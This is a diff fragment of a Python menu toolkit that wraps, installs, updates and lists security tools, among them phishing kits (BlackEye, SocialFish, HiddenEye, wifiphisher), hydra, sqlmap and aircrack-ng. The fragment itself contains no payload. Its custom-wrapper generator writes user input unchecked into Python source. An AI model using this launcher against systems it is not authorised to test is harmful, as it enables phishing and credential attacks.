+            if shutil.which(tool_cmd) and not hasattr(sys.modules[__name__], wrapper_name):
+                print(f"{Colors.OKBLUE}[*] Creating wrapper for {tool_name}...{Colors.ENDC}")
+                create_tool_wrapper(tool_cmd, tool_name, wrapper_name)
+    
+    print(f"{Colors.OKGREEN}[+] Tool integration completed!{Colors.ENDC}")
+
+def create_tool_wrapper(tool_cmd, tool_name, wrapper_name):
+    """Dynamically create a wrapper function for a tool"""
+    
+    def wrapper_func():
+        print(f"[+] {tool_name}")
+        print(f"[!] This tool requires proper configuration.")
+        
+        # Get target from user
+        target = input(f"Target for {tool_cmd}: ").strip()
+        if not target:
+            print("[-] Target required.")
+            return
+        
+        # Get additional options
+        options = input(f"Additional {tool_cmd} options (optional): ").strip()
+        
+        # Build command
+        cmd = [tool_cmd]
+        if options:
+            cmd.extend(options.split())
+        cmd.append(target)
+        
+        print(f"[+] Running: {' '.join(cmd)}")
+        
+        try:
+            # Run the tool
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            if proc.stdout is not None:
+                for line in proc.stdout:
+                    print(line, end='')
+            proc.wait()
+            print(f"[+] {tool_name} completed.")
+        except Exception as e:
+            print(f"[-] {tool_name} failed: {e}")
+        
+        input("\n[Press Enter to return to the menu]")
+    
+    # Add the wrapper to the global namespace
+    globals()[wrapper_name] = wrapper_func
+
+def manage_tools():
+    """Tool management system"""
+    print(f"{Colors.OKCYAN}[+] Tool Management System{Colors.ENDC}")
+    
+    while True:
+        print(f"\n{Colors.OKCYAN}=== Tool Management ==={Colors.ENDC}")
+        print("1. Install Missing Tools")
+        print("2. Update All Tools")
+        print("3. List Installed Tools")
+        print("4. Check Tool Status")
+        print("5. Auto-Integrate New Tools")
+        print("6. Create Custom Tool Wrapper")
+        print("0. Back to Main Menu")
+        
+        choice = input(f"\n{Colors.OKGREEN}Select Option > {Colors.ENDC}").strip()
+        
+        if choice == "1":
+            check_and_prompt_dependencies()
+        elif choice == "2":
+            update_all_tools()
+        elif choice == "3":
+            list_installed_tools()
+        elif choice == "4":
+            check_tool_status()
+        elif choice == "5":
+            auto_integrate_tools()
+        elif choice == "6":
+            create_custom_wrapper()
+        elif choice == "0":
+            break
+        else:
+            print("[-] Invalid option.")
+
+def update_all_tools():
+    """Update all installed tools"""
+    print(f"{Colors.OKBLUE}[*] Updating all tools...{Colors.ENDC}")
+    
+    # Update package manager tools
+    subprocess.run(["sudo", "apt", "update"])
+    subprocess.run(["sudo", "apt", "upgrade", "-y"])
+    
+    # Update Python tools
+    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
+    subprocess.run([sys.executable, "-m", "pip", "list", "--outdated", "--format=freeze"], capture_output=True)
+    
+    # Update Go tools
+    subprocess.run(["go", "install", "-u", "all"])
+    
+    # Update Ruby tools
+    subprocess.run(["sudo", "gem", "update"])
+    
+    # Update GitHub tools
+    github_tools = [
+        "/opt/BlackEye",
+        "/opt/SocialFish", 
+        "/opt/HiddenEye",
+        "/opt/wifiphisher",
+        "/opt/sherlock",
+        "/opt/Photon",
+        "/opt/subfinder",
+        "/opt/amass",
+        "/opt/nuclei",
+        "/opt/httpx",
+        "/opt/naabu",
+        "/opt/theHarvester",
+        "/opt/recon-ng",
+    ]
+    
+    for tool_path in github_tools:
+        if os.path.exists(tool_path):
+            print(f"{Colors.OKBLUE}[*] Updating {os.path.basename(tool_path)}...{Colors.ENDC}")
+            try:
+                subprocess.run(["sudo", "git", "-C", tool_path, "pull"], capture_output=True)
+            except Exception as e:
+                print(f"{Colors.FAIL}[-] Failed to update {tool_path}: {e}{Colors.ENDC}")
+    
+    print(f"{Colors.OKGREEN}[+] All tools updated!{Colors.ENDC}")
+
+def list_installed_tools():
+    """List all installed tools"""
+    print(f"{Colors.OKCYAN}[+] Installed Tools{Colors.ENDC}")
+    
+    # Check package manager tools
+    package_tools = ["nmap", "hydra", "sqlmap", "gobuster", "aircrack-ng", "bettercap", "dirb", "nikto", "whatweb"]
+    print(f"\n{Colors.OKBLUE}Package Manager Tools:{Colors.ENDC}")
+    for tool in package_tools:
+        if shutil.which(tool):
+            print(f"  ✓ {tool}")
+        else:
+            print(f"  ✗ {tool}")
+    
+    # Check GitHub tools
+    github_tools = [
+        ("BlackEye", "/opt/BlackEye"),
+        ("SocialFish", "/opt/SocialFish"),
+        ("HiddenEye", "/opt/HiddenEye"),
+        ("Wifiphisher", "/opt/wifiphisher"),
+        ("Sherlock", "/opt/sherlock"),
+        ("Photon", "/opt/Photon"),
+        ("Subfinder", "/opt/subfinder"),
+        ("Amass", "/opt/amass"),
+        ("Nuclei", "/opt/nuclei"),
+        ("HTTPX", "/opt/httpx"),
+        ("Naabu", "/opt/naabu"),
+        ("TheHarvester", "/opt/theHarvester"),
+        ("Recon-ng", "/opt/recon-ng"),
+    ]
+    
+    print(f"\n{Colors.OKBLUE}GitHub Tools:{Colors.ENDC}")
+    for name, path in github_tools:
+        if os.path.exists(path):
+            print(f"  ✓ {name}")
+        else:
+            print(f"  ✗ {name}")
+    
+    # Check Python tools
+    python_tools = ["requests", "beautifulsoup4", "selenium", "scapy", "shodan"]
+    print(f"\n{Colors.OKBLUE}Python Tools:{Colors.ENDC}")
+    for tool in python_tools:
+        try:
+            __import__(tool)
+            print(f"  ✓ {tool}")
+        except ImportError:
+            print(f"  ✗ {tool}")
+
+def check_tool_status():
+    """Check the status of all tools"""
+    print(f"{Colors.OKCYAN}[+] Tool Status Check{Colors.ENDC}")
+    
+    # Test core tools
+    core_tools = ["nmap", "hydra", "sqlmap", "gobuster"]
+    print(f"\n{Colors.OKBLUE}Testing Core Tools:{Colors.ENDC}")
+    
+    for tool in core_tools:
+        if shutil.which(tool):
+            try:
+                result = subprocess.run([tool, "--version"], capture_output=True, text=True, timeout=5)
+                if result.returncode == 0:
+                    version = result.stdout.split('\n')[0] if result.stdout else "Unknown"
+                    print(f"  ✓ {tool} - {version}")
+                else:
+                    print(f"  ⚠ {tool} - Installed but not working")
+            except Exception:
+                print(f"  ⚠ {tool} - Installed but not working")
+        else:
+            print(f"  ✗ {tool} - Not installed")
+
+def create_custom_wrapper():
+    """Create a custom tool wrapper"""
+    print(f"{Colors.OKCYAN}[+] Create Custom Tool Wrapper{Colors.ENDC}")
+    
+    tool_name = input("Tool name: ").strip()
+    if not tool_name:
+        print("[-] Tool name required.")
+        return
+    
+    tool_path = input("Tool path or command: ").strip()
+    if not tool_path:
+        print("[-] Tool path required.")
+        return
+    
+    category = input("Category (Network Reconnaissance/Web Testing/Wireless Attacks/etc.): ").strip()
+    if not category:
+        print("[-] Category required.")
+        return
+    
+    # Create wrapper function
+    wrapper_code = f'''
+def {tool_name.lower()}_wrapper():
+    print(f"[+] {tool_name}")
+    target = input("Target: ").strip()
+    if not target:
+        print("[-] Target required.")
+        return
+    
+    options = input("Additional options: ").strip()
+    cmd = ["{tool_path}"]
+    if options:
+        cmd.extend(options.split())
+    cmd.append(target)
+    
+    print(f"[+] Running: {{' '.join(cmd)}}")
+    try:
+        subprocess.run(cmd)
+    except Exception as e:
+        print(f"[-] Failed: {{e}}")
+    
+    input("\\n[Press Enter to return to the menu]")
+'''
+    
+    # Save wrapper to file
+    wrapper_file = f"custom_wrappers/{tool_name.lower()}_wrapper.py"
+    os.makedirs("custom_wrappers", exist_ok=True)
+    
+    with open(wrapper_file, "w") as f:
+        f.write(wrapper_code)
+    
+    print(f"{Colors.OKGREEN}[+] Custom wrapper created: {wrapper_file}{Colors.ENDC}")
+    print(f"{Colors.OKBLUE}[*] You can now use this tool in the {category} category{Colors.ENDC}")
